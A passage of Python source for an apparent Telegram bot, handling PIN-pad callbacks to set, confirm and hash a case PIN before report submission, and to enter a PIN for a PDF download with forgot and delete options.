            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb_pin_pad())
            await q.answer()
            return
        case_id = (ctx.user_data.get("pending_case_id") or "").strip()
        if not case_id:
            logger.error(
                "[PIN] CASE_CONFIRM_PIN without pending_case_id uid=%s",
                update.effective_user.id,
            )
            ctx.user_data["state"] = None
            ctx.user_data.pop("pin_input", None)
            ctx.user_data.pop("case_pin_first", None)
            await q.message.reply_text(
                "⚠️ <b>Session expired or incomplete.</b>\n\n"
                "Your case ID was lost before the PIN could be saved.\n"
                "Please use <b>/start</b>, complete your report again, and tap "
                "<b>Sign &amp; Submit</b> from the signature screen.",
                parse_mode="HTML",
            )
            await q.answer()
            return
        await db.set_case_pin_hash(case_id, _hash_pin(pin_str))
        ctx.user_data.pop("pin_input", None)
        ctx.user_data.pop("case_pin_first", None)
        ctx.user_data["state"] = None
        await _send_submit_loading(q.message)
        await do_actual_submit_and_sign(update, ctx)
        await q.answer()
        return
    digit = data.replace("pin|", "").strip()
    if digit.isdigit() and len(pin_input) < PIN_MAX:
        pin_input.append(int(digit))
        ctx.user_data["pin_input"] = pin_input
    dots = _pin_dots(len(pin_input))
    if state == "CASE_SET_PIN":
        text = (
            "[ 🔐 ] SET YOUR SECURITY PIN\n"
            f"{MAIN_SEP}\n\n"
            " Enter a new 6-digit PIN.\n"
            "  You will confirm it in the next step.\n\n"
            f"  {dots}\n\n"
            f"{MAIN_SEP}\n"
        )
    else:
        text = (
            "[ 🔐 ] CONFIRM YOUR PIN\n"
            f"{MAIN_SEP}\n\n"
            " Re-enter your 6-digit PIN.\n"
            "  Confirm to proceed.\n\n"
            f"  {dots}\n\n"
            f"{MAIN_SEP}\n"
        )
    try:
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb_pin_pad())
    except Exception:
        pass
    await q.answer()


async def handle_pdf_pin_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE, data: str):
    q = update.callback_query
    if ctx.user_data.get("state") != "PDF_PIN_WAIT":
        await q.answer()
        return
    pin_input = list(ctx.user_data.get("pin_input") or [])

    if data == "pin|forgot":
        await q.answer()
        ctx.user_data["recovery_origin"] = "PDF_DOWNLOAD"
        ctx.user_data["recovery_case_id"] = ctx.user_data.get("pdf_download_case_id")
        await q.message.reply_text(
            "🔑 <b>Forgot PIN?</b>\n"
            "Please use account recovery to reset your PIN, then retry Download PDF.",
            parse_mode="HTML",
            reply_markup=kb_recovery_menu(),
        )
        return

    if data == "pin|del":
        if pin_input:
            pin_input.pop()
            ctx.user_data["pin_input"] = pin_input
        try:
            await q.edit_message_text(
                _build_pdf_pin_prompt_text(len(pin_input)),
                parse_mode="HTML",
                reply_markup=kb_pin_pad(show_forgot=True),
            )
        except Exception:
            pass
        await q.answer()
        return

    if data == "pin|confirm":
        if len(pin_input) != PIN_MAX:
            await q.answer(f"Enter {PIN_MAX} digits first.", show_alert=True)
            return
        pin = "".join(str(x) for x in pin_input)
        await q.answer()
        await _process_pdf_pin_and_send(update, ctx, pin, q.message)
        return

    digit = data.replace("pin|", "").strip()
    if digit.isdigit() and len(pin_input) < PIN_MAX:
        pin_input.append(int(digit))
        ctx.user_data["pin_input"] = pin_input
    try:
        await q.edit_message_text(
            _build_pdf_pin_prompt_text(len(pin_input)),
            parse_mode="HTML",
            reply_markup=kb_pin_pad(show_forgot=True),
        )
    except Exception:
        pass
    await q.answer()


